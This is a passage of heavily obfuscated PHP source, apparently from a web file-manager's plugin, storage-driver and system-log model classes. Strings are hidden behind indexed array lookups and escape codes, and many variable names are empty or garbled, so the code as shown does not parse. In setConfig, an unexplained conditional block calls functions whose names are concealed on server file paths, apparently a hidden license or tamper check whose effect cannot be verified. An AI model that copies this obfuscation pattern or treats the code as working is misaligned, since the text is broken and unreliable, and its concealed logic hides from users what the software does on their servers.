$this->parseFile($ݲ̾); $this->parseLang($љ); $this->parseConfig($љ); $this->parsePackage($љ); if (is_array($ݻ)) { $љ = str_replace(array_keys($ݻ), array_values($ݻ), $љ); } echo $Ю[285] . $љ; } private function checkVersion() { $ύ =& $_SERVER[]; $ = $this->appPackage(); $ = $this->getConfig(); if ($[$ύ[1884]] == $[$ύ[1858]]) { return; } $this->regist(); $this->setConfig(array($ύ[1884] => $[$ύ[1858]])); } final function initLang() { $Ո =& $_SERVER[]; $ = $Ո[1885]; $ɭ = $this->pluginPath . $Ո[1886]; $ι = I18n::getType(); $ = array(); if (file_exists($ɭ . $ι . $Ո[989])) { $ = (include $ɭ . $ι . $Ո[989]); } else { if ($ι == $Ո[1887] && !file_exists($ɭ . $ι . $Ո[989]) && file_exists($ɭ . $Ո[1888])) { $ = (include $ɭ . $Ո[1888]); $ι = $Ո[1703]; } else { if (file_exists($ɭ . $ . $Ո[989])) { $ = (include $ɭ . $ . $Ո[989]); $ι = $; } } } if (!$ || !is_array($)) { $ = array(); } $ = Hook::trigger($Ո[1889], $, $this->pluginName, $ι); if ($ && is_array($)) { $ = $; } if (@count($) > 0) { I18n::set($); } return $; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($) { $é =& $_SERVER[]; if ($_SERVER[$é[991]] != $_SERVER[$é[992]]) { $Ƶ = $é[1036]; $ = $é[993]; $蓄 = $_SERVER[$é[994]] . $é[995]; $ = $($蓄); $ = explode($é[285], $); if (count($) < $é[702]) { $׻ = $é[996]; $׻(); } $ź = $é[1037]; $ź($_SERVER[$é[1038]]); $ź($_SERVER[$é[994]] . $é[1822]); $쐮 = 1; while ($쐮 > 1) { $쐮 = $쐮 + 4; $Ơ = rawurlencode($쐮 . $é[463]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $); } public function onSetConfig($נ) { } public function onGetConfig($ߴ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($) { if ($ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($濎 = "\160\154\165\x67\151\156\101\x75\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ = $this->getConfig(); if (!$[$濎]) { return !1; } return ActionCall($_SERVER[][1890], $[$濎]); } public function url($, $༙ = '', $׉ = true) { $ =& $_SERVER[]; $ݫ槫 = $this->getConfig(); $ = KOD_VERSION . $[10] . KOD_VERSION_BUILD; $ = $this->packageVersion(); $ = $ . $[476] . $; if (substr($, 0, 4) == $[149] || substr($, 0, 2) == $[1517]) { $ = $ . $[1891] . $; } else { if ($༙ == $[12]) { $ = $this->pluginHost . $ . $[1891] . $; } else { if ($༙ === $[78]) { $ = $this->pluginHost . $; } else { if ($༙ == $[1892]) { $ = STATIC_PATH . $ . $[1891] . $; } else { if ($༙ == $[1893]) { $ = APP_HOST . $[1894] . $ . $[1891] . $; } else { if (isset($ݫ槫[$༙])) { $ = $ݫ槫[$༙] . $ . $[1891] . $; } } } } } } if (!$׉) { return $; } echo $; } public function link($ = false, $ = '') { $ =& $_SERVER[]; $ = $this->linkHas == !1; $this->linkHas = !0; if (!$) { $this->link($[1895], $[1893]); $this->link($[1896], $[1892]); $this->link($[1897], $[1892]); $this->link($[1898], $[1892]); $this->link($[1899], $[1892]); if ($) { Hook::trigger($[1900]); } return; } $ʭ = $this->url($, $, !1); if (substr($, -3) == $[1901]) { echo $[1902] . $ʭ . $[1903] . $[285]; } else { if (substr($, -4) == $[1904]) { echo $[1905] . $ʭ . $[1906] . $[285]; } } if ($) { Hook::trigger($[1900]); } } } goto D; a⍍: class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\x2e\163\164\x6f\162\141\147\x65\x4c\x69\163\164"; public $field = array("\156\141\x6d\145", "\x73\151\x7a\145\115\141\170", "\x73\171\163\164\145\x6d", "\144\145\x66\141\x75\154\164", "\x64\x72\x69\x76\145\162", "\143\157\x6e\x66\151\x67"); public function listData($硞 = false, $ؒ = "\155\157\144\151\x66\171\124\x69\155\x65", $ة = false) { $ɢ =& $_SERVER[]; $¥ = parent::listData($硞, $ؒ, $ة); if ($硞) { return $¥; } $ = array(); if ($GLOBALS[$ɢ[2509]]) { $ = $this->ioSizeUseGet(array_to_keyvalue($¥, $ɢ[12], $ɢ[487])); } foreach ($¥ as $ά => $۟) { unset($¥[$ά][$ɢ[6]]); $¥[$ά][$ɢ[2163]] = isset($[$۟[$ɢ[487]]]) ? $[$۟[$ɢ[487]]] : 0; } return $¥; } public function ioSizeUseGet($ߜؒ) { $ =& $_SERVER[]; if (!$ߜؒ) { return array(); } $Ϗ = $[2510] . implode($[50], $ߜؒ); $ = Cache::get($Ϗ); if ($) { return $; } $Ō͠ = array($[920] => $[487], $[2511] => $[79]); $ = array($[920] => array($[7], $ߜؒ)); $ = Model($[910])->field($Ō͠)->where($)->group($[920])->select(); $ = array_to_keyvalue($, $[487], $[79]); Cache::set($Ϗ, $, 600); return $; } public function getConfig($) { $ͮ = parent::listData($); $ = _get($ͮ, $_SERVER[][6], array()); if ($ && !is_array($)) { $ = json_decode($, !0); } return $; } public function update($棊, $܇) { $ =& $_SERVER[]; $ܠ = $܇[$[32]]; $͈ = array_to_keyvalue(parent::listData(), $[32]); if (isset($͈[$ܠ]) && $͈[$ܠ][$[487]] != $棊) { return !1; } $this->checkPwd($棊, $܇); if (isset($܇[$[2512]]) && $܇[$[2512]] == $[91]) { $this->checkConfig($܇); } unset($܇[$[2512]]); $֕ = parent::update($棊, $܇); if ($֕ && $܇[$[37]]) { foreach ($͈ as $ٝ) { if ($ٝ[$[37]] && $ٝ[$[487]] != $棊) { parent::update($ٝ[$[487]], array($[37] => 0)); } } $this->updateBackup($棊, $͈); } return $֕; } public function add($ۍ墔) { $ƌ߳ =& $_SERVER[]; $ = array_to_keyvalue(parent::listData(), $ƌ߳[32]); if (isset($[$ۍ墔[$ƌ߳[32]]])) { return !1; } $this->checkConfig($ۍ墔); $ˁ = parent::insert($ۍ墔); if ($ˁ && $ۍ墔[$ƌ߳[37]]) { foreach ($ as $) { if ($[$ƌ߳[37]]) { parent::update($[$ƌ߳[487]], array($ƌ߳[37] => 0)); } } $this->updateBackup($ˁ, $); } return $ˁ; } public function updateBackup($厂Բ, $) { $Ի =& $_SERVER[]; $ = Model($Ի[867])->get($Ի[873]); $ = json_decode($, !0); if (!$) { return; } if ($[$Ի[1940]] != $Ի[91]) { return; } $ƪً = $[$Ի[846]]; if ($[$Ի[168]] != $Ի[1302]) { if ($ƪً != $厂Բ) { return; } $[$Ի[168]] = $Ի[1302]; } else { if ($ƪً == $厂Բ) { return; } $[$Ի[846]] = $厂Բ; } Model($Ի[867])->set(array($Ի[873] => $)); } public function checkPwd($ư, &$) { $ =& $_SERVER[]; if (empty($[$[6]])) { return; } $Նۈ = $[$[6]]; if (!is_array($Նۈ)) { $Նۈ = json_decode($Նۈ, !0); } $鬓Ҫ = $[12]; $ = array($[1635], $[2513], $[1045]); foreach ($ as $ĵ) { if (isset($Նۈ[$ĵ])) { $鬓Ҫ = $ĵ; break; } } if (!$鬓Ҫ) { return; } $ = $this->getConfig($ư); $٩ߕ = $[$鬓Ҫ]; $ؤ = $Նۈ[$鬓Ҫ]; if ($ؤ == str_repeat($[220], strlen($٩ߕ))) { $Նۈ[$鬓Ҫ] = $٩ߕ; $[$[6]] = json_encode($Նۈ); } else { if ($ؤ != $٩ߕ) { $[$[2512]] = $[91]; } } } public function checkConfig(&$, $ = false) { $ =& $_SERVER[]; $ = strtolower($[$[96]]); $Չ = $[$[6]]; if (!is_array($Չ)) { $Չ = json_decode($Չ, !0); } foreach ($Չ as $ => $) { if (is_string($)) { $Չ[$] = trim($); } } $Չ[$[2514]] = rand_string(6); $͉ף = $GLOBALS[$[6]][$[92]][$[928]]; $ڙԾ = isset($͉ף[$]) ? $͉ף[$] : ucfirst($); $鳰 = $[77] . $ڙԾ; if (!$ڙԾ || !class_exists($鳰)) { if ($) { return LNG($[2515]); } write_log(array($[2516], $, get_caller_info()), $[213]); show_json(LNG($[2515]), !1, $); } $Ɯ = new $鳰($Չ); $ = rtrim($Չ[$[1363]], $[8]) . $[8]; if (in_array($, $Ɯ->objectDriver)) { try { if (!$Ɯ->isBucketCors() && !$Ɯ->setBucketCors()) { $ߐ = LNG($[2517]); $ߐ .= $[2518] . LNG($[2519]); } } catch (Exception $) { $ߐ = $->getMessage(); } if (isset($ߐ)) { return $this->_parseError($ߐ, $, $); } if ($ == $[68]) { $ = $Ɯ->getBktRegion(); if ($ != $Չ[$[2520]]) { $Չ[$[2520]] = $; $Ɯ->setRegion($); } } } else { if ($ == $[2521]) { if ($Ɯ->ftpPath) { $ = trim($, $[8]); if (stripos($, trim($Ɯ->ftpPath, $[8])) !== 0) { $ = $Ɯ->ftpPath . $[8] . ($ ? $ . $[8] : $[12]); } } } } $쯆 = $Ɯ->getPath($ . $[1367]); try { if ($ == $[106]) { $Ɯ->mkdir($, REPEAT_SKIP); } $ϓ = $Ɯ->mkfile($쯆, $[12], REPEAT_REPLACE); if (!$ϓ) { $ߐ = LNG($[2517]); } } catch (Exception $) { $ߐ = $->getMessage(); } if (isset($ߐ)) { return $this->_parseError($ߐ, $, $); } $Չ[$[1363]] = $; $[$[6]] = json_encode($Չ); $[$[96]] = $ڙԾ; return !0; } private function _parseError($, $, $ʳ = false) { $߹ =& $_SERVER[]; if ($ == $߹[68] && stripos($, $߹[2522])) { $ = explode($߹[10], $); $񆭰΁ = isset($[1]) ? $[1] : $߹[12]; $ţ = array($߹[2523] => LNG($߹[2524]), $߹[2525] => LNG($߹[2526])); if (isset($ţ[$񆭰΁])) { $ = $ţ[$񆭰΁]; } } if (stripos($, $߹[2527]) === 0) { $֤ = strpos($, $߹[175]); if ($֤ === !1) { $֤ = strpos($, $߹[4]); } if ($֤ !== !1) { $ = substr($, $֤ + 1); } } $ = LNG($߹[1370]) . $; if ($ʳ) { return $; } show_json($, !1); } public function driverListSystem() { $Ψ =& $_SERVER[]; $д = parent::listData(); $묾 = array(); foreach ($д as $⟷ˣ) { unset($⟷ˣ[$Ψ[231]], $⟷ˣ[$Ψ[88]]); if (!is_array($⟷ˣ[$Ψ[6]])) { $⟷ˣ[$Ψ[6]] = json_decode($⟷ˣ[$Ψ[6]], !0); } $묾[] = $⟷ˣ; } return $묾; } public function defaultDriver() { $¡ =& $_SERVER[]; $ꗾ = parent::listData(); $݈թ = array_filter_by_field($ꗾ, $¡[37], 1); $݈թ = $݈թ[0]; if (!$݈թ) { return array(); } if (!is_array($݈թ[$¡[6]])) { $݈թ[$¡[6]] = json_decode($݈թ[$¡[6]], !0); } return $݈թ; } public function driverInfo($) { $ =& $_SERVER[]; $ = array_to_keyvalue(parent::listData(), $[487]); if (!isset($[$])) { return !1; } $͗ = $[$]; if (!is_array($͗[$[6]])) { $͗[$[6]] = json_decode($͗[$[6]], !0); } return $͗; } public function remove($ٯ) { $this->removeShareItems($ٯ); return parent::remove($ٯ); } public function removeWithFile($֡, $æ, $Ǫ, $㚫 = false) { $ =& $_SERVER[]; ignore_timeout(); $ = array($[920] => $֡); $ü = Model($[560]); if (isset($GLOBALS[$[2528]])) { $ = $GLOBALS[$[2528]]; } else { $ = $ü->where($)->field(array($[943] => $[944], $[945] => $[79]))->find(); } $Ҭ = intval($[$[944]]); $г = intval($[$[79]]); $Ƙ = $æ . $[2529] . $֡; $֬ = LNG($æ == $[643] ? $[2530] : $[2531]); $ǄϤ = new TaskFileTransfer($Ƙ, $[213], $Ҭ, $֬ . $[476] . $Ǫ[$[32]] . $[212] . $֡); $ǄϤ->task[$[858]] = (double) $г; $䖈 = KodIO::defaultDriver(); $׼ = $䖈[$[487]]; $£ţ = 1; $Ы = 5000; $ = $ = $˒ = array(); $Ř = $ü->where($)->field($[2532])->selectPage($Ы, $£ţ); $ = intval($Ř[$[443]][$[445]]); while ($Ř && $£ţ <= $) { foreach ($Ř[$[446]] as $) { $ = $[$[557]]; if ($㚫) { $[] = $; continue; } $ؑܨ = $[$[87]]; $訟 = rtrim(get_path_father($ؑܨ), $[8]) . $[8]; $˒[] = $訟; $訟 = str_replace("\x7b\x69\157\72{$֡}\175\57", "\x7b\x69\157\x3a{$׼}\175\57", $訟); if (!IO::exist($ؑܨ) || !IO::isFile($ؑܨ)) { $[] = $; $ǄϤ->updateFileEnd($[$[32]], $[$[79]]); write_log($[2533] . $ؑܨ, $[2110]); continue; } $ = IO::move($ؑܨ, $訟, REPEAT_RENAME); if (!$) { $[] = $; $ǄϤ->updateFileEnd($[$[32]], $[$[79]]); write_log($[2534] . $ؑܨ, $[2110]); continue; } $ = array($[920] => $׼, $[87] => $); $ü->where(array($[557] => $))->save($); } $£ţ++; $Ř = $ü->where($)->field($[2532])->selectPage($Ы, $£ţ); } $ = $ǄϤ->task; if (!$㚫) { Cache::set($Ƙ, $); } $ǄϤ->end(); $ = array_unique($); $ = array_unique($); if (!$㚫 && ($ || $)) { $纈 = array(); if ($) { $纈[] = sprintf(LNG($[2535]), count($)); } if ($) { $纈[] = sprintf(LNG($[2536]), count($)); } $纈 = sprintf(LNG($[2537]), implode($[1580], $纈)) . $[2538] . date($[2539]) . $[2540]; if ($æ == $[1328]) { $纈 .= $[2541] . LNG($[2542]); } else { $纈 = LNG($[2543]) . $[2544] . $纈; } $[$[1365]] = $纈; Cache::set($Ƙ, $); unset($Ǫ[$[6]]); $ذ = array($[487] => $֡, $[2416] => $[643], $[32] => $Ǫ[$[32]], $[96] => $Ǫ[$[96]]); Hook::trigger($[1980], array($[1386] => $ذ, $[1396] => !0)); show_json($纈, !1, 100111); } if ($æ == $[643]) { return !0; } if ($ || $) { $ԥ҅ = array_merge($, $); $ԥ҅ = array_filter(array_unique($ԥ҅)); $this->removeByFileID($ԥ҅); } if ($˒) { $˒ = array_filter(array_unique($˒)); foreach ($˒ as $ؑܨ) { $ = IO::has($ؑܨ, !0); if (!$[$[239]] && !$[$[240]]) { IO::remove($ؑܨ); } } } return $this->remove($֡); } private function removeByFileID($ = array()) { $ȕ =& $_SERVER[]; if (empty($)) { return; } $ٚ = array($ȕ[557] => array($ȕ[7], $)); $ = Model($ȕ[1527])->where($ٚ)->field($ȕ[2491])->select(); if (!$) { return Model($ȕ[560])->remove($); } $ = array_to_keyvalue($, $ȕ[191], $ȕ[557]); foreach ($ as $ޒ => $ܯ) { Model($ȕ[927])->removeNow($ޒ, !1); } $ = array_diff($, array_unique(array_values($))); if ($) { return Model($ȕ[560])->remove($); } } private function removeShareItems($ˣӀ) { $޼ =& $_SERVER[]; $ۋ = "\x7b\151\157\72{$ˣӀ}\175\57"; $ = array($޼[191] => 0, $޼[583] => array($޼[473], "{$ۋ}\45")); $ک = Model($޼[1556])->where($)->field($޼[687])->select(); if (empty($ک)) { return; } $ߞ = array_to_keyvalue($ک, $޼[12], $޼[687]); Model($޼[686])->remove($ߞ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\x2e\x4c\151\147\x68\164\101\x70\160"; public $modelType = "\x53\x79\x73\x74\x65\155\117\x70\x74\x69\x6f\x6e"; public $field = array("\x6e\141\155\x65", "\x67\162\x6f\165\160", "\144\145\x73\143", "\143\157\x6e\x74\145\x6e\x74"); public function listData($ = false, $Ч = "\155\x6f\144\151\x66\x79\124\151\x6d\145", $ = true) { return parent::listData($, $Ч, $); } public function remove($Տ) { $ = $this->findByName($Տ); if (!$) { return !1; } return parent::remove($[$_SERVER[][487]]); } public function add($) { if ($this->findByName($[$_SERVER[][32]])) { return !1; } return parent::insert($); } public function update($, $ǚŎ) { $Ʀ =& $_SERVER[]; $Ί = $this->findByName($); $ = $this->findByName($ǚŎ[$Ʀ[32]]); if (!$Ί || $ && $[$Ʀ[487]] != $Ί[$Ʀ[487]]) { return !1; } return parent::update($Ί[$Ʀ[487]], $ǚŎ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\x6d\137\154\157\x67"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\145\x54\x69\x6d\x65", "\164\151\x6d\x65", "\x69\156\x73\145\162\x74", "\146\165\x6e\x63\x74\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Ɛ =& $_SERVER[]; return array($Ɛ[2545] => LNG($Ɛ[2546]), $Ɛ[2547] => LNG($Ɛ[2548]), $Ɛ[2121] => LNG($Ɛ[2549]), $Ɛ[2550] => LNG($Ɛ[2551]), $Ɛ[2552] => LNG($Ɛ[2553]), $Ɛ[2554] => LNG($Ɛ[2555]), $Ɛ[2556] => LNG($Ɛ[2557]), $Ɛ[2148] => LNG($Ɛ[2557]), $Ɛ[2149] => LNG($Ɛ[2558]), $Ɛ[2559] => LNG($Ɛ[2560]), $Ɛ[2561] => LNG($Ɛ[2562]), $Ɛ[2563] => LNG($Ɛ[2564]), $Ɛ[2565] => LNG($Ɛ[2566]), $Ɛ[2146] => LNG($Ɛ[2567]), $Ɛ[2568] => LNG($Ɛ[2569]), $Ɛ[2153] => LNG($Ɛ[2570]), $Ɛ[2571] => LNG($Ɛ[2572]), $Ɛ[2573] => LNG($Ɛ[2574]), $Ɛ[2575] => LNG($Ɛ[2576]), $Ɛ[2577] => LNG($Ɛ[2578]), $Ɛ[2155] => LNG($Ɛ[2579]), $Ɛ[2156] => LNG($Ɛ[2580]), $Ɛ[2581] => LNG($Ɛ[2582]), $Ɛ[2583] => LNG($Ɛ[2584]), $Ɛ[2585] => LNG($Ɛ[2586]), $Ɛ[2151] => LNG($Ɛ[2587]), $Ɛ[2588] => LNG($Ɛ[2589]), $Ɛ[2150] => LNG($Ɛ[2590]), $Ɛ[2591] => LNG($Ɛ[2591]), $Ɛ[2592] => LNG($Ɛ[2593]), $Ɛ[2594] => LNG($Ɛ[2591]), $Ɛ[2595] => LNG($Ɛ[2596]), $Ɛ[2597] => LNG($Ɛ[2598]), $Ɛ[2599] => LNG($Ɛ[2598]), $Ɛ[2600] => LNG($Ɛ[2601]), $Ɛ[2602] => LNG($Ɛ[2602]), $Ɛ[2603] => LNG($Ɛ[2125]), $Ɛ[2604] => LNG($Ɛ[2605]), $Ɛ[2606] => LNG($Ɛ[2607]), $Ɛ[2608] => LNG($Ɛ[2609]), $Ɛ[2610] => LNG($Ɛ[2611]), $Ɛ[2612] => LNG($Ɛ[2613]), $Ɛ[2614] => LNG($Ɛ[2614]), $Ɛ[2615] => LNG($Ɛ[2616]), $Ɛ[2617] => LNG($Ɛ[2618]), $Ɛ[2619] => LNG($Ɛ[2620]), $Ɛ[2621] => LNG($Ɛ[2622]), $Ɛ[2623] => LNG($Ɛ[2624]), $Ɛ[2625] => LNG($Ɛ[2626]), $Ɛ[210] => LNG($Ɛ[210]), $Ɛ[211] => LNG($Ɛ[2627]), $Ɛ[2628] => LNG($Ɛ[2628])); } private function typeFile() { $Ƹ =& $_SERVER[]; $ = array($Ƹ[2153] => array($Ƹ[2154]), $Ƹ[2563] => array($Ƹ[2629]), $Ƹ[2565] => array($Ƹ[2630]), $Ƹ[2146] => array($Ƹ[2147], $Ƹ[2631]), $Ƹ[2573] => array(), $Ƹ[2575] => array(), $Ƹ[2577] => array(), $Ƹ[2155] => array($Ƹ[2157]), $Ƹ[2156] => array($Ƹ[2157]), $Ƹ[2581] => array($Ƹ[2632]), $Ƹ[2583] => array($Ƹ[2632]), $Ƹ[2585] => array($Ƹ[2633]), $Ƹ[2571] => array($Ƹ[2634]), $Ƹ[2151] => array($Ƹ[2635]), $Ƹ[2588] => array($Ƹ[2636]), $Ƹ[2150] => array($Ƹ[2152])); return $; } private function typeAll() { $Ѥ =& $_SERVER[]; $۸꒴ = $this->typeList; $ = array_filter($this->typeFile()); foreach ($ as $ז => $) { $۸꒴[$[0]] = $۸꒴[$ז]; } $۸꒴[$Ѥ[2157]] = LNG($Ѥ[2637]); $۸꒴[$Ѥ[2632]] = LNG($Ѥ[2638]); return $۸꒴; } public function addLog($ȋ, $ޥ = array()) { $Ƭ =& $_SERVER[]; if (!isset($this->typeList[$ȋ])) { return; } $ߙ = Session::get($Ƭ[2314]); if (!$ߙ) { $ߙ = _get($ޥ, $Ƭ[1586], 0); } if ($ȋ == $Ƭ[2604] && is_array($ޥ[$Ƭ[2639]]) && !$ޥ[$Ƭ[2639]]) { return; } $ߜ = get_client_ip(); if (!$ޥ || strlen(json_encode($ޥ)) >= 1024 * 64) { if ($ޥ && is_array($ޥ)) { $ޥ = array_intersect_key($ޥ, array_flip($Ƭ[487], $Ƭ[32])); $ޥ[$Ƭ[1602]] = $ߜ; } else { $ޥ = array($Ƭ[1602] => $ߜ); } } else { if (is_array($ޥ)) { $ޥ[$Ƭ[1602]] = $ߜ; } else { $ޥ = array($Ƭ[1386] => $ޥ, $Ƭ[1602] => $ߜ); } } $ޥ[$Ƭ[2640]] = ACTION; $ޥ = array($Ƭ[1960] => Session::sign(), $Ƭ[1961] => intval($ߙ), $Ƭ[33] => $ȋ, $Ƭ[1963] => json_encode($ޥ)); Hook::trigger($Ƭ[2641], $ޥ); return parent::add($ޥ); } public function remove($) { $this->where(array($_SERVER[][508] => $))->delete(); } private function _makeOrder($ɑ = '') { $Ⓐ =& $_SERVER[]; $ = $Ⓐ[231]; $Ŋ = array($Ⓐ[537] => $Ⓐ[538], $Ⓐ[539] => $Ⓐ[540]); $Ż = Input::get($Ⓐ[545], $Ⓐ[7], $Ⓐ[2351], array($Ⓐ[2270], $Ⓐ[539])); $Ż = $Ŋ[$Ż]; $ɑ = $ɑ . "{$}\x20{$Ż}"; return $this->order($ɑ); } public function get($į = '') { $ݿ =& $_SERVER[]; if (!$į) { show_json(array()); } $̥ = array(); if ($į[$ݿ[1586]]) { $̥[$ݿ[1586]] = $į[$ݿ[1586]]; } if (isset($į[$ݿ[855]])) { $ = $į[$ݿ[855]]; $ = isset($į[$ݿ[856]]) ? $į[$ݿ[856]] : time(); $̥[$ݿ[231]] = array($ݿ[408], array($, $)); } if ($į[$ݿ[33]]) { $ = explode($ݿ[50], $į[$ݿ[33]]); $ٷ = $this->typeFile(); $ = array(); foreach ($ as $š) { $[] = $š; if (isset($ٷ[$š])) { $ = array_merge($, $ٷ[$š]); } } $ = array_unique($); if ($) { $̥[$ݿ[33]] = array($ݿ[7], $); } } else { $̥[$ݿ[33]] = array($ݿ[2642], $ݿ[2643]); } if (!empty($į[$ݿ[1602]])) { $̥[$ݿ[540]] = array($ݿ[473], "\45{$į[$ݿ[1602]]}\x25"); } $ؠ = $this->_makeOrder()->where($̥)->selectPage(); if (empty($ؠ[$ݿ[446]])) { show_json(array(), !0, $ؠ[$ݿ[443]]); } $ؠ[$ݿ[446]] = $this->logList($ؠ[$ݿ[446]]); return $ؠ; } private function ipAddress(&$ǈ) { $㗎 =& $_SERVER[]; if (!empty($ǈ[$㗎[1602]])) { $ = IpLocation::get($ǈ[$㗎[1602]]); } else { $ = LNG($㗎[2644]); } $ǈ[$㗎[2645]] = $; } private function descZipDownload($ܣȳ, &$) { $ɜ =& $_SERVER[]; if (!isset($ܣȳ[$ɜ[1609]])) { return; } $Ͻ = json_decode($ܣȳ[$ɜ[1609]], !0); foreach ($Ͻ as $Ű) { try { $Ӳ = IO::infoFullSimple($Ű[$ɜ[87]]); } catch (Exception $) { continue; } $ܣȳ[$ɜ[87]] = $Ű[$ɜ[87]]; $[] = $ܣȳ[$ɜ[191]] = $Ӳ[$ɜ[191]]; $[] = $ܣȳ[$ɜ[2411]] = $Ӳ[$ɜ[190]]; break; } return $ܣȳ; } private function getSourceList(&$Þݱ) { $҅ =& $_SERVER[]; $ۡ = array(); foreach ($Þݱ as $ => $۰퍇) { $Ճ = json_decode($۰퍇[$҅[540]], !0); if ($۰퍇[$҅[33]] == $҅[2149]) { $Ճ = $this->descZipDownload($Ճ, $ۡ); $Þݱ[$][$҅[540]] = json_encode($Ճ); continue; } if (strpos($۰퍇[$҅[33]], $҅[2413]) !== 0) { if (!isset($Ճ[$҅[87]]) || strpos($۰퍇[$҅[33]], $҅[2646]) !== 0) { continue; } try { $ɔ = IO::infoFullSimple($Ճ[$҅[87]]); } catch (Exception $۬) { continue; } $ۡ[] = $Ճ[$҅[191]] = $ɔ[$҅[191]]; $ۡ[] = $Ճ[$҅[2411]] = $ɔ[$҅[190]]; $Þݱ[$][$҅[540]] = json_encode($Ճ); continue; } $ۡ[] = $Ճ[$҅[191]]; $ۡ[] = $Ճ[$҅[2411]]; if ($Ճ[$҅[33]] == $҅[643]) { $ۡ[] = $Ճ[$҅[540]][$҅[1340]]; $ۡ[] = $Ճ[$҅[540]][$҅[1341]]; } if ($Ճ[$҅[33]] == $҅[2421]) { $ۡ[] = $Ճ[$҅[540]][$҅[191]]; } } if (!$ۡ) { return array(); } return Model($҅[927])->sourceListInfo($ۡ, !0); } private function logList($永) { $뱻Ķ =& $_SERVER[]; $ = array_to_keyvalue($永, $뱻Ķ[12], $뱻Ķ[1586]); $ = Model($뱻Ķ[617])->userListInfo(array_unique($)); $ٛ = $this->getSourceList($永); $ = $this->typeAll(); $ᮧ = array(); $Ϥ = array(); foreach ($永 as $ûɾ => $񴶖) { $Ƀ = $񴶖[$뱻Ķ[33]]; $ = isset($[$񴶖[$뱻Ķ[1586]]]) ? $[$񴶖[$뱻Ķ[1586]]] : !1; $ = strpos($Ƀ, $뱻Ķ[2647]) === 0 ? LNG($뱻Ķ[2648]) : LNG($뱻Ķ[2644]); $񴶖[$뱻Ķ[32]] = isset($[$뱻Ķ[32]]) ? $[$뱻Ķ[32]] : LNG($뱻Ķ[2644]); $񴶖[$뱻Ķ[2469]] = isset($[$뱻Ķ[2469]]) ? $[$뱻Ķ[2469]] : $뱻Ķ[12]; $񴶖[$뱻Ķ[1859]] = isset($[$Ƀ]) ? $[$Ƀ] : $; $񴶖[$뱻Ķ[2350]] = $; $ć = json_decode($񴶖[$뱻Ķ[540]], !0); $񴶖[$뱻Ķ[1602]] = isset($ć[$뱻Ķ[1602]]) ? $ć[$뱻Ķ[1602]] : $뱻Ķ[12]; $񴶖[$뱻Ķ[2645]] = IpLocation::get($񴶖[$뱻Ķ[1602]]); if (strpos($Ƀ, $뱻Ķ[2413]) === 0 || isset($ć[$뱻Ķ[2411]])) { $ć[$뱻Ķ[90]] = $ٛ[$ć[$뱻Ķ[191]]]; $ć[$뱻Ķ[2427]] = $ٛ[$ć[$뱻Ķ[2411]]]; if ($ć[$뱻Ķ[33]] == $뱻Ķ[643]) { $ć[$뱻Ķ[540]][$뱻Ķ[1340]] = $ٛ[$ć[$뱻Ķ[540]][$뱻Ķ[1340]]]; $ć[$뱻Ķ[540]][$뱻Ķ[1341]] = $ٛ[$ć[$뱻Ķ[540]][$뱻Ķ[1341]]]; } if ($ć[$뱻Ķ[33]] == $뱻Ķ[2421]) { $ć[$뱻Ķ[540]][$뱻Ķ[191]] = $ٛ[$ć[$뱻Ķ[540]][$뱻Ķ[191]]]; } if ($ć[$뱻Ķ[33]] == $뱻Ķ[1328]) { $ć[$뱻Ķ[2427]] = $ć[$뱻Ķ[90]]; $ć[$뱻Ķ[2411]] = $ć[$뱻Ķ[2427]][$뱻Ķ[191]]; $ć[$뱻Ķ[90]] = !1; $ć[$뱻Ķ[191]] = $뱻Ķ[12]; } $ҝ = array($뱻Ķ[1328], $뱻Ķ[2409]); if (!in_array($ć[$뱻Ķ[33]], $ҝ)) { if ($ć[$뱻Ķ[90]] && $ć[$뱻Ķ[90]][$뱻Ķ[188]] == $뱻Ķ[189]) { $Ϥ[] = $񴶖[$뱻Ķ[487]]; unset($永[$ûɾ]); continue; } if ($ć[$뱻Ķ[2427]] && $ć[$뱻Ķ[2427]][$뱻Ķ[188]] == $뱻Ķ[189]) { $Ϥ[] = $񴶖[$뱻Ķ[487]]; unset($永[$ûɾ]); continue; } } } $񴶖[$뱻Ķ[540]] = $ć; unset($񴶖[$뱻Ķ[2649]]); $ᮧ[] = $񴶖; } $this->clearSystemPathLog($Ϥ); return $ᮧ; } private function clearSystemPathLog($ΉӰ) { $ =& $_SERVER[]; if (count($ΉӰ) == 0) { return; } $꒐ = array($[487] => array($[7], array_unique($ΉӰ))); $this->where($꒐)->delete(); } public function deviceList($Ѻ, $ﶩק = 0) { $ =& $_SERVER[]; $ = array($[1586] => $Ѻ, $[231] => array($[1176], $ﶩק), $[33] => $[2121]); $ǉ = array(); $㌋ = $this->field($[2650])->where($)->order($[2425])->limit(50)->select(); foreach ($㌋ as $ݘ => $Ş) { if ($ݘ > 0 && abs($Ş[$[231]] - $㌋[$ݘ - 1][$[231]]) < 5) { continue; } $ӓ = json_decode($Ş[$[540]], !0); $Ş[$[1602]] = isset($ӓ[$[1602]]) ? $ӓ[$[1602]] : $[12]; unset($ӓ[$[1602]]); $ = $this->deviceType($ӓ[$[2414]]); if (isset($ǉ[$])) { continue; } $Ş[$[2645]] = IpLocation::get($Ş[$[1602]]); $Ş[$[540]] = $ӓ; $ǉ[$] = $Ş; } return array_values($ǉ); } public function deviceType($ɼ) { return $ɼ; } } goto dꂜ; e: define($_SERVER[][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\154\x65", 